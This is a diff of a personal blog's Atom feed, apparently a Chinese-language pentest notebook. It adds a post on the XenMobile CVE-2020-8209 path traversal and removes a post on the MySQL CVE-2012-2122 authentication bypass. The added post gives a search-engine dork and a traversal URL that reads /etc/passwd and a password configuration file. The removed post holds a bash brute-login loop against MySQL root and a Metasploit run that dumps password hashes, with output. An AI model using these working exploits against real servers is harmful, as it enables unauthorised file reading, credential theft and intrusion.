@@ -6,7 +6,7 @@
   <link href="https://askding.github.io/atom.xml" rel="self"/>
   
   <link href="https://askding.github.io/"/>
-  <updated>2020-12-12T04:20:18.000Z</updated>
+  <updated>2020-12-13T06:50:45.000Z</updated>
   <id>https://askding.github.io/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>XenMobile</title>
+    <link href="https://askding.github.io/Kali/Exploit/XenMobile.html"/>
+    <id>https://askding.github.io/Kali/Exploit/XenMobile.html</id>
+    <published>2020-12-13T06:50:45.000Z</published>
+    <updated>2020-12-13T06:50:45.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>编写进度</p><ul><li><p><input checked="" disabled="" type="checkbox"> </p><p>XenMobile MDM是一种可靠的移动设备管理解决方案，可以对企业设备和员工个人设备进行基于角色的管理和配置并确保安全性。完成用户设备注册后，IT部门可以自动为设备置备策略和应用，将应用列入黑名单或白名单，检测并防止使用越狱设备，擦除或有选择性地擦除丢失、被盗或不符合规定的设备中的数据。用户可以使用自己喜爱的任何设备，而IT部门可以确保企业资产的合规性，并有效保护设备中保存的企业内容。</p></li></ul><h2 id="XenMobile目录穿越-CVE-2020-8209"><a href="#XenMobile目录穿越-CVE-2020-8209" class="headerlink" title="XenMobile目录穿越 CVE-2020-8209"></a>XenMobile目录穿越 CVE-2020-8209</h2><p>CVE-2020-8209，路径遍历漏洞。此漏洞允许未经授权的用户读取任意文件，包括包含密码的配置文件。</p><p>通过空间引擎关键字</p><p>“XenMobile控制台” 或者 “XenMobile - Console”</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><pre><code class="zsh">/jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd/jsp/help-sb-download.jsp?sbFileName=../../../opt/sas/sw/config/sftu.properties</code></pre><h3 id="漏洞建议"><a href="#漏洞建议" class="headerlink" title="漏洞建议"></a>漏洞建议</h3><p>官方补丁删除了/opt/sas/sw/tomcat/inst1/webapps/ROOT/jsp/help-sb-download.jsp</p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/p&gt;
+&lt;p&gt;XenMobile MDM是一种可靠的移动设备管理解决方案，可以对企业设备和员工个人设备进行基于角色的管理和配置并确保安全</summary>
+      
+    
+    
+    
+    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
+    
+    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>SpaceVim</title>
@@ -486,30 +513,6 @@
       
     <summary type="html">&lt;p&gt;REmote DIctionary Server(Redis) 是一个开源的Key-Value数据存储系统，使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型，并提供多种语言的API。&lt;/p&gt;
 &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信</summary>
-      
-    
-    
-    
-    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
-    
-    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>MySQL</title>
-    <link href="https://askding.github.io/Kali/Exploit/MySQL.html"/>
-    <id>https://askding.github.io/Kali/Exploit/MySQL.html</id>
-    <published>2020-12-04T12:23:41.000Z</published>
-    <updated>2020-12-04T12:23:41.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><pre><code class="zsh">sudo nmap -sV -Pn -T4 -sSU -p 3306 -sC    192.168.79.207                                                           Host discovery disabled (-Pn). All addresses will be marked &#39;up&#39; and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 18:28 CSTNmap scan report for 192.168.79.207Host is up (0.00013s latency).PORT     STATE  SERVICE VERSION3306/tcp open   mysql   MySQL 5.5.23| mysql-info:|   Protocol: 10|   Version: 5.5.23|   Thread ID: 2|   Capabilities flags: 63487|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, SupportsCompression, LongPassword, SupportsLoadDataLocal, ODBCClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, IgnoreSigpipes, FoundRows, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults|   Status: Autocommit|   Salt: &lt;~&#39;EdI|Z*b0d,Ly&gt;hpy2|_  Auth Plugin Name: mysql_native_password3306/udp closed mysqlNmap done: 1 IP address (1 host up) scanned in 0.45 seconds</code></pre><h2 id="MySQL认证绕过漏洞-CVE-2012-2122"><a href="#MySQL认证绕过漏洞-CVE-2012-2122" class="headerlink" title="MySQL认证绕过漏洞 CVE-2012-2122"></a>MySQL认证绕过漏洞 CVE-2012-2122</h2><p>  当连接MariaDB/MySQL时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是memcmp()返回一个非零值，也会使MySQL认为两个密码是相同的。<br>也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。</p><h3 id="bash脚本利用"><a href="#bash脚本利用" class="headerlink" title="bash脚本利用"></a>bash脚本利用</h3><blockquote><p>在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录</p></blockquote><pre><code> for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2&gt;/dev/null; done  Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 603Server version: 5.5.23 Source distributionType &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; </code></pre><h2 id="MSF利用"><a href="#MSF利用" class="headerlink" title="MSF利用"></a>MSF利用</h2><blockquote><p>mysql_authbypass_hashdump</p></blockquote><pre><code>$ msfconsolemsf &gt; use auxiliary/scanner/mysql/mysql_authbypass_hashdumpmsf  auxiliary(mysql_authbypass_hashdump) &gt; set USERNAME rootmsf  auxiliary(mysql_authbypass_hashdump) &gt; set RHOSTS 127.0.0.1msf  auxiliary(mysql_authbypass_hashdump) &gt; run[+] 127.0.0.1:3306 The server allows logins, proceeding with bypass test[*] 127.0.0.1:3306 Authentication bypass is 10% complete[*] 127.0.0.1:3306 Authentication bypass is 20% complete[*] 127.0.0.1:3306 Successfully bypassed authentication after 205 attempts[+] 127.0.0.1:3306 Successful exploited the authentication bypass flaw, dumping hashes...[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D[+] 127.0.0.1:3306 Saving HashString as Loot: root:*C8998584D8AA12421F29BB41132A288CD6829A6D[+] 127.0.0.1:3306 Saving HashString as Loot: debian-sys-maint:*C59FFB311C358B4EFD4F0B82D9A03CBD77DC7C89[*] 127.0.0.1:3306 Hash Table has been saved: 20120611013537_default_127.0.0.1_mysql.hashes_889573.txt[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;pre&gt;&lt;code class=&quot;zsh&quot;&gt;sudo nmap -sV -Pn -T4 -sSU -p 3306 -sC    </summary>
       
     
     
